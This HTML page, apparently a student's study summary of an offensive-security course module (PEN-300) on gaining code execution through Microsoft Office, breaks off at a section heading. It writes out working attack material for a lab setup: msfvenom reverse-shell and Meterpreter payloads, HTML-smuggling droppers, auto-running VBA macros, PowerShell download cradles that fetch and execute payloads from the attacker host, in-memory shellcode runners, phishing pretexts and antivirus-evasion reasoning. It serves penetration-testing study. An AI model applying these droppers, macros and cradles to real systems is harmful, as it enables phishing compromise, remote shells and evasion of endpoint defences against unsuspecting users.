@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 3 — Client-Side Code Execution with Office: droppers, HTML smuggling, and VBA macros — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 3 — Client-Side Code Execution with Office: droppers, HTML smuggling, and VBA macros</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Two ways to gain unauthorized remote access: exploit a vulnerable internet-facing service (no victim interaction, but the target must run vulnerable software), or trick a user into running malicious code. User behavior is much harder to patch than software, which makes the second vector the primary focus of this module: <strong>gain code execution by abusing Microsoft Office</strong>, the suite users commonly use and trust (a 2018 Cisco report attributed <strong>38% of all email phishing attacks</strong> to Office).</p>
+<p>The module builds the full client-side ladder:</p>
+<ol>
+<li><strong>Droppers &amp; payloads</strong> — staged vs non-staged Metasploit payloads, msfvenom generation, Netcat and <code>multi/handler</code> catchers.</li>
+<li><strong>HTML smuggling</strong> — browser-side automatic dropper delivery via the HTML5 anchor <code>download</code> attribute, Blobs, and object URLs.</li>
+<li><strong>VBA macros</strong> — macro basics, auto-execution traps (<code>Document_Open</code>/<code>AutoOpen</code>), Trust Center and Protected View, and launching processes from Word.</li>
+</ol>
+<p>Lab IPs used throughout (verbatim from the course): attacker <code>192.168.119.120</code>, Windows 10 victim <code>192.168.120.11</code>. No credentials appear in this module.</p>
+<h2>Techniques</h2>
+<h3>1. Will you be my dropper</h3>
+<p>Real-world scenario: a Trojan (script or document) is delivered to the victim and tricked into execution. Traditional trojans embed the entire payload; more complex <strong>dropper</strong> trojans use a staged payload with a <strong>callback</strong> function that connects back to the attack machine to download the second stage. The delivered code may be written to disk or run directly from memory; its objective is a communication channel back to the attacker. Names for the code running on the victim: implant, agent, backdoor, malware.</p>
+<p>That code must reach <strong>C2</strong> infrastructure, carrying the attacker's hostname/domain or IP over a protocol such as HTTP/HTTPS (may simulate user activity) or DNS (simulates common network activity). In this module the C2 is simply the attack machine itself; Metasploit streamlines the process.</p>
+<h3>2. Staged vs non-staged payloads</h3>
+<ul>
+<li><strong>Non-staged</strong>, e.g. <code>windows/shell_reverse_tcp</code>: self-contained assembly that calls Windows APIs to connect back and expose <code>cmd.exe</code>.</li>
+<li><strong>Staged</strong>, e.g. <code>windows/shell/reverse_tcp</code>: minimal first stage performs the callback, retrieves the remaining code, executes it in memory — smaller memory footprint, may evade antivirus.</li>
+</ul>
+<p>Delimiter convention: non-staged uses <code>_</code> in the name, staged uses <code>/</code> (the payload description also states it):</p>
+<pre><code>windows/x64/meterpreter_reverse_https    Connect back to attacker and spawn a Meterpreter shell
+windows/x64/meterpreter/reverse_https    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64).
+</code></pre>
+<h3>3. Building the droppers</h3>
+<p>Non-staged executable, saved to the Apache web root, plus a Netcat catcher:</p>
+<pre><code class="language-bash">sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o /var/www/html/shell.exe
+sudo service apache2 start
+sudo nc -lnvp 444
+</code></pre>
+<p>Victim-side: browse to the payload URL in Edge, download, execute, accept warnings → reverse shell from <code>192.168.120.11</code> in the listener.</p>
+<p>Staged Meterpreter comparison (same construction, protocol from the payload suffix, LPORT 443 = typical HTTPS port):</p>
+<pre><code class="language-bash">sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe
+# Payload size: 207449 bytes / Final size of exe file: 214016 bytes
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
+# Payload size: 694 bytes / Final size of exe file: 7168 bytes
+</code></pre>
+<p>The non-staged payload is <strong>nearly thirty times larger</strong> — significantly more detection surface for endpoint security. Staged payloads require the <strong><code>multi/handler</code></strong> module, which listens for callbacks and delivers the second stage:</p>
+<pre><code>sudo msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 192.168.119.120
+set lport 443
+exploit
+</code></pre>
+<p>Running <code>msfstaged.exe</code> on the victim: a ~7 KB callback executes, then 207,449 bytes are staged in memory and a Meterpreter session opens (<code>192.168.119.120:443 -&gt; 192.168.120.11:49678</code>).</p>
+<h3>4. HTML smuggling</h3>
+<p>Manual download-and-run works for a demo; real attackers embed a link in an email so that JavaScript <strong>automatically saves the dropper</strong> when the victim visits the page. The technique leverages the HTML5 anchor tag <code>download</code> attribute, which instructs the browser to automatically download a file when the hyperlink is clicked.</p>
+<p>Simplest form (exposes filename/extension, needs a click):</p>
+<pre><code class="language-html">&lt;html&gt;&lt;body&gt;
+  &lt;a href=&quot;/msfstaged.exe&quot; download=&quot;msfstaged.exe&quot;&gt;DownloadMe&lt;/a&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>Fully automatic version — three steps, all in memory:</p>
+<ol>
+<li>Store the payload in a JavaScript <strong>Blob</strong> (<code>{type: 'octet/stream'}</code>) — the <code>download</code> attribute also accepts an embedded Blob, not just server files.</li>
+<li>Create a URL file object with <code>window.URL.createObjectURL(blob)</code> — simulates a file on the web server but reads from memory.</li>
+<li>Create an <strong>invisible anchor</strong> (<code>display: none</code>), set <code>href</code> to the object URL, set <code>download</code> to the on-disk filename, and call <code>a.click()</code>.</li>
+</ol>
+<p>The binary itself is Base64-encoded and decoded back into a byte array client-side:</p>
+<pre><code class="language-javascript">function base64ToArrayBuffer(base64) {
+  var binary_string = window.atob(base64);
+  var len = binary_string.length;
+  var bytes = new Uint8Array(len);
+  for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+  return bytes.buffer;
+}
+</code></pre>
+<p>Generate and encode the payload (strip line breaks — embed as one continuous string, or wrap each line in quotes):</p>
+<pre><code class="language-bash">sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
+base64 /var/www/html/msfstaged.exe
+</code></pre>
+<p>Complete smuggling page (listing 15 in the course): <code>base64ToArrayBuffer(file)</code> → <code>new Blob([data], {type: 'octet/stream'})</code> → hidden anchor with <code>a.download = fileName</code> → <code>a.click()</code> → <code>window.URL.revokeObjectURL(url)</code>.</p>
+<p>Behavior and caveats:</p>
+<ul>
+<li>Browsing the page in <strong>Google Chrome</strong> triggers the download with no user interaction (Chrome supports <code>window.URL.createObjectURL</code>; IE/Edge need modification — exercise: use <code>window.navigator.msSaveBlob</code>).</li>
+<li>The saved executable is marked as browser-originated, so <strong>SmartScreen</strong> blocks execution: click <em>More info</em> → <em>Run anyway</em>.</li>
+<li>Running it yields a Meterpreter session via <code>multi/handler</code> (session 2 in the course walkthrough).</li>
+<li>The filename was set to <code>msfstaged.exe</code>; a warning may appear because the attachment is an executable — a limitation the later module sections (Office documents) sidestep.</li>
+</ul>
+<h3>5. Phishing with Microsoft Office (module intro)</h3>
+<p>Office comes in two variants — Office 365 (continuously updated, online storage) and standalone versions like Office 2016. Its ubiquity makes it a prime phishing target because victims trust it. The attack vector explored from here: <strong>VBA</strong>, the embedded programming language.</p>
+<p>Lab prep: install Office 2016 on the Windows 10 victim VM from <code>C:\installs\Office2016.img</code> (mounted as a virtual CD, run <code>Setup.exe</code>, accept the license agreement on the 7-day trial).</p>
+<h3>6. Introduction to VBA</h3>
+<p>Workflow: in Word, <strong>View → Macros</strong>, select the <em>current document</em> from the dropdown (e.g. "Document1 (document)") so the VBA embeds in this document only — otherwise it is saved to the global template. Name the macro (e.g. <code>MyMacro</code>) → <strong>Create</strong> opens the VBA editor.</p>
+<p>Language basics:</p>
+<ul>
+<li><code>Sub MyMacro() ... End Sub</code> defines a method (cannot return values); <code>Function ... End Function</code> can.</li>
+<li>Variables declared with <code>Dim name As type</code> — <code>String</code> (unicode string), <code>Long</code> (64-bit integer), <code>LongPtr</code> (memory pointer); these map to the OS native types used in C/C++.</li>
+<li>Flow: <code>If ... Then ... Else ... End If</code> branching; <code>For counter = 1 To 3 ... Next counter</code> loops (increment at <code>Next</code>).</li>
+<li>Run with the Run Macro button or F5.</li>
+</ul>
+<p>Auto-execution traps — the victim will not run the macro willingly, so leverage the document-open hooks:</p>
+<pre><code class="language-vba">Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+</code></pre>
+<p>Continuing the listing:</p>
+<pre><code class="language-vba">    MsgBox (&quot;This is a macro test&quot;)
+End Sub
+</code></pre>
+<p>Both hooks are used for redundancy (<code>Document_Open</code> is called <code>Workbook_Open</code> in Excel). The document must be saved in a <strong>macro-enabled format</strong> — <code>.doc</code> (Word 97-2003) or <code>.docm</code>; the newer <code>.docx</code> does not store macros.</p>
+<p>Office security (File → Options → Trust Center → Trust Center Settings):</p>
+<ul>
+<li>Default macro setting: <strong>"Disable all macros with notification"</strong> — reopening the saved document shows a security warning banner instead of executing; <em>Enable Content</em> runs it. The attack must therefore persuade the victim to <strong>both open the document and enable macros</strong>.</li>
+<li><strong>Protected View</strong> (since Office 2010): sandbox for documents originating from the Internet — macros disabled, external images blocked, extra warning shown. The attack must also trick the user out of Protected View (addressed later in the course).</li>
+</ul>
+<p>Launching processes from VBA — two equivalents, both hidden:</p>
+<pre><code class="language-vba">Sub MyMacro()
+    Dim str As String
+    str = &quot;cmd.exe&quot;
+    Shell str, vbHide                    ' VBA Shell function; vbHide = 0
+End Sub
+</code></pre>
+<pre><code class="language-vba">Sub MyMacro()
+    Dim str As String
+    str = &quot;cmd.exe&quot;
+    CreateObject(&quot;Wscript.Shell&quot;).Run str, 0    ' Windows Script Host
+End Sub
+</code></pre>
+<p>Verification: Process Explorer (SysInternals, <code>C:\Tools</code>) shows <code>cmd.exe</code> as a child process of <code>WINWORD.EXE</code>. Note the security warning only reappears when the document is <strong>renamed</strong> — per-document macro enablement persists.</p>
+<h2>Exercises (as given in the course)</h2>
+<ul>
+<li>Experiment with different non-staged and staged Metasploit payloads and use the <code>multi/handler</code> module to receive the shell.</li>
+<li>Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format of your choosing; modify the smuggling code to also use <code>window.navigator.msSaveBlob</code> so the technique works with Microsoft Edge.</li>
+<li>Install Microsoft Office on your Windows 10 client VM.</li>
+<li>Experiment with VBA programming.</li>
+</ul>
+<h3>7. Let PowerShell help us (download cradles in VBA)</h3>
+<p>VBA is compiled and typed; PowerShell compiles and executes on the fly through the .NET framework, is generally untyped, and more flexible. Syntax notes: variables via <code>$</code>, comparisons use <code>-eq</code>/<code>-ne</code> instead of <code>==</code>/<code>!=</code>. Because PowerShell reaches .NET, it makes ideal <strong>download cradles</strong>. Most use HTTP/HTTPS, but a cradle over <strong>DNS TXT records</strong> is possible (later in the course).</p>
+<p>Four-line cradle (Listing 23) vs the one-liner (Listing 24):</p>
+<pre><code class="language-powershell">$url = &quot;http://192.168.119.120/msfstaged.exe&quot;
+$out = &quot;msfstaged.exe&quot;
+$wc = New-Object Net.WebClient
+$wc.DownloadFile($url, $out)
+</code></pre>
+<pre><code class="language-powershell">(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
+</code></pre>
+<p>Embedded in VBA: <code>Shell</code> launches PowerShell with the cradle as the argument, hidden (<code>vbHide</code>). Downloaded content lands in the document's current folder, so the executable path is built from <code>ActiveDocument.Path</code>. Word (unlike Excel) has no sleep function, so a custom <code>Wait</code> procedure uses a <code>Do</code> loop with <code>DoEvents</code> (keeps Word responsive) until <code>Now &gt;= DateAdd("s", n, t)</code>.</p>
+<pre><code class="language-vba">Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+</code></pre>
+<p>Continuing the listing:</p>
+<pre><code class="language-vba">    Dim str As String
+    str = &quot;powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')&quot;
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path &amp; &quot;\&quot; &amp; &quot;msfstaged.exe&quot;
+    Wait (2)
+    Shell exePath, vbHide
+End Sub
+
+</code></pre>
+<p>The listing proceeds:</p>
+<pre><code class="language-vba">Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now &gt;= DateAdd(&quot;s&quot;, n, t)
+End Sub
+</code></pre>
+<p>Result: on open (macros enabled), the document pulls <code>msfstaged.exe</code> from the web server, waits 2 seconds, executes it hidden → reverse Meterpreter shell. (<code>multi/handler</code> must be listening.)</p>
+<h3>8. Keeping up appearances — pretexting and the old switcheroo</h3>
+<p>Client-side phishing requires deceiving the victim, often multiple times: open the file, enable macros, browse to a URL — all without alerting them. A <strong>pretext</strong> is a false motive used in a social engineering attack. Phishing exploits curiosity or fear; common ruses: job applications, healthcare contract updates, invoices, HR requests. The classic Office pattern — present a document, claim it's encrypted/protected, ask the user to <em>Enable Editing</em> and <em>Enable Content</em> — is used in the wild by <strong>Quasar RAT</strong> and the <strong>Ursnif Trojan</strong>.</p>
+<p>Legitimacy cues: no spelling/grammar mistakes, content matching the ruse, trusted product names/logos (Microsoft, RSA), encryption-standard talk. The course example: a job-application document "encrypted per GDPR regulations" with random Base64 text and an RSA logo, targeted at an HR analyst opening.</p>
+<p><strong>The switcheroo</strong> keeps the deception going after <em>Enable Content</em>: the victim expects "decrypted" content, so show it — and keep the document open long enough for the shell.</p>
+<ol>
+<li>Copy the document, delete the placeholder text, create the fake CV.</li>
+<li>Select the CV text → <em>Insert &gt; Quick Parts &gt; AutoTexts &gt; Save Selection to AutoText Gallery</em>; name it <strong>TheDoc</strong>. Delete it from the body; paste the fake RSA-encrypted blob into the body.</li>
+<li>VBA swaps the blob for the CV: select the whole <code>ActiveDocument.Content</code> range, <code>Selection.Delete</code>, then insert from the AutoText gallery:</li>
+</ol>
+<pre><code class="language-vba">Sub Document_Open()
+    SubstitutePage
+End Sub
+
+Sub AutoOpen()
+    SubstitutePage
+End Sub
+
+Sub SubstitutePage()
+</code></pre>
+<p>Same listing, continued:</p>
+<pre><code class="language-vba">    ActiveDocument.Content.Select
+    Selection.Delete
+    ActiveDocument.AttachedTemplate.AutoTextEntries(&quot;TheDoc&quot;).Insert Where:=Selection.Range, RichText:=True
+End Sub
+</code></pre>
+<p>The victim sees the "decrypted" CV and believes the document behaved exactly as promised — this pretext has repeatedly tricked victims into disabling both Protected View and macro security.</p>
+<h3>9. Executing shellcode in Word memory — why and which APIs</h3>
+<p>Downloading an executable has two drawbacks: it may be flagged by network monitoring, and it lands on disk where antivirus can scan it. The upgrade: execute the staged Meterpreter payload <strong>directly in memory</strong>. Pure VBA can't do this (the payload is raw assembly), but VBA can call <strong>native Win32 APIs</strong> in DLLs (unmanaged code) via the <code>Declare</code> keyword — <code>Private Declare</code> keeps the import local to our code.</p>
+<p>Mapping C types to VBA (poorly documented; MSDN has partial comparisons):
+- <code>LPSTR</code> (pointer to string) → VBA <code>String</code> passed <strong>ByVal</strong> (a VBA String already holds the pointer).
+- <code>LPDWORD</code> (pointer to DWORD) → VBA <code>Long</code> passed <strong>ByRef</strong> (ByRef yields the pointer).
+- <code>BOOL</code> return → <code>Long</code>.</p>
+<p>Warm-up (Listings 33–36) — <code>GetUserNameA</code> from <code>Advapi32.dll</code>, then trim the fixed 256-byte buffer at its null terminator:</p>
+<pre><code class="language-vba">Private Declare Function GetUserName Lib &quot;advapi32.dll&quot; Alias &quot;GetUserNameA&quot; (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+
+Function MyMacro()
+  Dim res As Long
+  Dim MyBuff As String * 256
+  Dim MySize As Long
+  Dim strlen As Long
+  MySize = 256
+
+</code></pre>
+<p>Continuing the listing:</p>
+<pre><code class="language-vba">  res = GetUserName(MyBuff, MySize)
+  strlen = InStr(1, MyBuff, vbNullChar) - 1
+  MsgBox Left$(MyBuff, strlen)
+End Function
+</code></pre>
+<h3>10. The VBA shellcode runner (VirtualAlloc → RtlMoveMemory → CreateThread)</h3>
+<p>The classic three-API runner, all from <code>Kernel32.dll</code>:</p>
+<ol>
+<li><strong>VirtualAlloc</strong> — allocate RWX memory (other allocation APIs return non-executable memory because of <strong>DEP</strong>).</li>
+<li><strong>RtlMoveMemory</strong> — copy the shellcode into it byte by byte.</li>
+<li><strong>CreateThread</strong> — start a new execution thread at the buffer.</li>
+</ol>
+<p>Declarations (Listings 38, 42, 45):</p>
+<pre><code class="language-vba">Private Declare PtrSafe Function VirtualAlloc Lib &quot;KERNEL32&quot; (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib &quot;KERNEL32&quot; (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib &quot;KERNEL32&quot; (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+</code></pre>
+<p>Shellcode generation — note the architecture reasoning: target is 64-bit Windows, but <strong>Word 2016 installs 32-bit by default</strong>, so generate <strong>32-bit</strong> shellcode in <code>vbapplication</code> format, with <code>EXITFUNC=thread</code> so an exiting shellcode doesn't kill Word:</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+# Payload size: 575 bytes / Final size of vbapplication file: 1972 bytes
+# buf = Array(&lt;first payload bytes&gt;)
+</code></pre>
+<p>Runner body (Listings 40, 43, 46):</p>
+<pre><code class="language-vba">Dim buf As Variant
+Dim addr As LongPtr
+Dim res As Long
+Dim counter As Long
+Dim data As Long
+
+buf = Array(&lt;msfvenom -f vbapplication output&gt;) ' 575-byte payload
+</code></pre>
+<p>With the 575 bytes staged in <code>buf</code>, the runner body allocates executable memory and copies the payload in:</p>
+<pre><code class="language-vba">addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)  ' MEM_COMMIT|MEM_RESERVE, RWX
+
+' copy buf into addr byte-by-byte with RtlMoveMemory (Listing 43, loop elided),
+' then hand addr to CreateThread (Listing 46)
+</code></pre>
+<p>Details that matter:
+- <code>lpAddress = 0</code> lets the OS pick the address; <code>dwSize</code> is computed <strong>dynamically</strong> with <code>UBound(buf)</code> so payload swaps need no edits.
+- <code>&amp;H3000</code> = <code>MEM_COMMIT | MEM_RESERVE</code>; <code>&amp;H40</code> = readable, writable, executable.
+- <code>RtlMoveMemory</code>'s <code>sSource</code> is declared <code>Any</code> and passed <strong>ByRef</strong> (address of the array element); destination is already a pointer, length is 1 byte per iteration.
+- <code>CreateThread</code> mostly takes zeros — only <code>lpStartAddress</code> (the shellcode buffer) matters.</p>
+<p>Feeding this through the same macro scaffolding (auto-open traps + shellcode in <code>buf</code>) gives a Word document that executes Meterpreter entirely in memory.</p>
+<h3>11. Finish the VBA runner, then its weaknesses</h3>
+<p>Full runner (Listing 47) = declarations + <code>buf</code> array + <code>VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)</code> + copy loop + <code>CreateThread(0,0,addr,0,0,0)</code> inside <code>MyMacro</code>, wired to both auto-open traps. The shell calls back entirely in memory — the matching <code>multi/handler</code> must be <strong>32-bit</strong> with <code>EXITFUNC=thread</code>.</p>
+<p>Trade-off: low profile (no executable on disk), but <strong>the shell dies when Word closes</strong>. Metasploit's AutoMigrate solves this; this module explores an alternative.</p>
+<p>Two remaining weaknesses drive the rest of the module:
+1. The document embeds the staged shellcode on disk where AV may scan it.
+2. If the victim closes Word, the in-memory shell dies with it.</p>
+<p>Fix: move the shellcode out of the document into a PowerShell script on the web server, and run PowerShell as a <strong>child process</strong> of Word — by default the child survives Word's exit.</p>
+<h3>12. PowerShell shellcode runner (P/Invoke + Add-Type)</h3>
+<p>PowerShell can't natively call Win32 APIs, but .NET lets us use C# in the PowerShell session via <strong>DllImportAttribute</strong> (unmanaged DLL invocation) with C-type→C# translations from <strong>P/Invoke</strong> (<code>pinvoke.net</code> is the standard reference). Namespaces <code>System</code> and <code>System.Runtime.InteropServices</code> come in through <code>using</code>.</p>
+<p>Warm-up (MessageBox):</p>
+<pre><code class="language-powershell">$User32 = @&quot;
+using System;
+using System.Runtime.InteropServices;
+
+public class User32 {
+    [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
+    public static extern int MessageBox(IntPtr hWnd, String text,
+        String caption, int options);
+}
+</code></pre>
+<p>Continuing the listing:</p>
+<pre><code class="language-powershell">&quot;@
+
+Add-Type $User32
+
+[User32]::MessageBox(0, &quot;This is an alert&quot;, &quot;MyBox&quot;, 0)
+</code></pre>
+<p>Notes: <code>@"..."@</code> declares a <strong>Here-String</strong> (text block); <strong><code>Add-Type</code> forces .NET to compile the C# code</strong> into an object we can call. Word 2016 is 32-bit, so PowerShell spawned from it is 32-bit too — test from the 32-bit ISE: <code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe</code>.</p>
+<p>Porting the runner: same three steps, but VBA's <code>RtlMoveMemory</code> byte loop is replaced by the .NET <code>[System.Runtime.InteropServices.Marshal]::Copy</code> (managed array → unmanaged pointer). P/Invoke translations for <code>VirtualAlloc</code> and <code>CreateThread</code>:</p>
+<pre><code class="language-powershell">$Kernel32 = @&quot;
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport(&quot;kernel32&quot;, CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+</code></pre>
+<p>The listing proceeds:</p>
+<pre><code class="language-powershell">}
+&quot;@
+
+Add-Type $Kernel32
+
+[Byte[]] $buf = &lt;msfvenom -f ps1 output&gt;   # 480-byte payload
+
+$size = $buf.Length
+
+</code></pre>
+<p>The invocation then follows the §7/§11 chain one-for-one (allocate, copy, launch — Listing 65 shows it verbatim).</p>
+<p>Shellcode: <code>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1</code> (480 bytes payload). Running from ISE yields the Meterpreter session via <code>multi/handler</code>.</p>
+<p><strong>First bug — PowerShell dies early.</strong> Wire it to Word with a <code>DownloadString</code> cradle (no disk write for the script itself):</p>
+<pre><code class="language-vba">Sub MyMacro()
+    Dim str As String
+    str = &quot;powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX&quot;
+    Shell str, vbHide
+End Sub
+</code></pre>
+<p>Apache log confirms the GET; Process Explorer (quickly) shows PowerShell starting then terminating. Root cause: unlike the VBA runner whose parent (Word) stayed alive, this shell is a child of a PowerShell process that finishes its script and exits. Fix — import and call <strong><code>WaitForSingleObject</code></strong> with the thread handle and a wait of <code>0xFFFFFFFF</code> (forever):</p>
+<pre><code class="language-powershell">    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+        UInt32 dwMilliseconds);
+...
+[Kernel32]::WaitForSingleObject($thandle, [uint32]&quot;0xFFFFFFFF&quot;)
+</code></pre>
+<p>The <code>[uint32]</code> cast is required because PowerShell only uses signed integers. Result: PowerShell lingers as a child of <code>WINWORD.EXE</code> and the shell survives — payload no longer in the document, execution appears fully in memory.</p>
+<h3>13. PowerShell leaves disk artifacts — the Add-Type compilation problem</h3>
+<p>"Runs in memory" is not literally true: <code>Add-Type</code> compiles through the <strong>Visual C# Command-Line Compiler (<code>csc</code>)</strong>, which temporarily writes <strong>both the .cs source and the compiled .dll assembly to disk</strong>. Demonstration with <strong>Process Monitor</strong> (SysInternals; note: not Process Explorer):</p>
+<ul>
+<li>Filter → file writes by <code>powershell_ise.exe</code>, apply, clear events with <strong>Ctrl+X</strong> (the course writes C+x).</li>
+<li>Running the MessageBox code produces <code>CreateFile/WriteFile/CloseFile</code> events on randomly-named files like <code>rtylilrr.0.cs</code> and <code>rtylilrr.dll</code>.</li>
+</ul>
+<p>Confirm the assembly is loaded into the process:</p>
+<pre><code class="language-powershell">[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
+</code></pre>
+<p>→ <code>rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null</code> appears among loaded assemblies. Endpoint AV can flag exactly these artifacts, so the runner must be rebuilt to avoid <code>Add-Type</code> altogether.</p>
+<h3>14. Dynamic lookup — reusing UnsafeNativeMethods</h3>
+<p>Alternative to <code>DllImport</code>: <strong>dynamic lookup</strong>, the low-level C way. Two OS APIs find function addresses without compiling anything:</p>
+<ul>
+<li><strong><code>GetModuleHandle</code></strong> — handle (memory address) of a DLL.</li>
+<li><strong><code>GetProcAddress</code></strong> — function address given DLL handle + name.</li>
+</ul>
+<p>Both must be invoked from <strong>already-loaded</strong> assemblies (creating a new assembly is exactly what we're avoiding). Hunting them with the course's assembly sweep (Listing 72) — piping <code>[AppDomain]::CurrentDomain.GetAssemblies()</code> through <code>Get-Member -Static</code> and filtering on <code>TypeName.Contains('Unsafe')</code> — turns up <code>Microsoft.Win32.UnsafeNativeMethods</code>.</p>
+<p>Output includes <code>Microsoft.Win32.UnsafeNativeMethods</code> exposing <strong>both</strong> <code>GetModuleHandle</code> and <code>GetProcAddress</code> (plus <code>GetModuleFileName</code>, event-log APIs, etc.). Locate the owning assembly by printing <code>$_.Location</code> and matching <code>TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')</code>:</p>
+<pre><code>C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll
+</code></pre>
+<p>→ <strong>System.dll</strong> — a fundamental .NET library that is always loaded in PowerShell. We can therefore call <code>GetModuleHandle</code>/<code>GetProcAddress</code> through <code>[Microsoft.Win32.UnsafeNativeMethods]</code> without ever touching <code>csc</code>.</p>
+<h3>15. The catch — UnsafeNativeMethods internals, and reflection</h3>
